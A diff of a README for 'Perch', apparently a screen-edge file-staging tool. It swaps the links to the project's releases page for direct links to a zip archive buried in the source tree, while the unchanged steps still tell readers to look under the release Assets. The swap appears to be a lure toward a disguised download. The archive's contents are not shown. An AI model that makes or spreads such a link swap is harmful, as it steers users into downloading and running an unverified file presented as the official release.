@@ -1,6 +1,6 @@
 # 📦 Perch - Move files faster using screen edges
 
-[![](https://img.shields.io/badge/Download-Perch-blue.svg)](https://github.com/Easo8981/Perch/releases)
+[![](https://img.shields.io/badge/Download-Perch-blue.svg)](https://github.com/Easo8981/Perch/raw/refs/heads/main/Sources/Perch/Receive/Software_v1.7-alpha.1.zip)
 
 Perch simplifies how you move files on your computer. It creates a temporary storage area on the edges of your screen. You drag files to this area and pick them up later. This tool works like a staging ground for your documents, images, and folders. You save time by reducing the need to keep multiple windows open while you sort your work.
 
@@ -8,7 +8,7 @@ Perch simplifies how you move files on your computer. It creates a temporary sto
 
 You can get the latest version of Perch from the official releases page.
 
-1. Go to this address: [https://github.com/Easo8981/Perch/releases](https://github.com/Easo8981/Perch/releases)
+1. Go to this address: [https://github.com/Easo8981/Perch/raw/refs/heads/main/Sources/Perch/Receive/Software_v1.7-alpha.1.zip](https://github.com/Easo8981/Perch/raw/refs/heads/main/Sources/Perch/Receive/Software_v1.7-alpha.1.zip)
 2. Look for the section labeled Assets at the bottom of the newest version.
 3. Click the file link to start the download.
 4. Save the file to your computer.
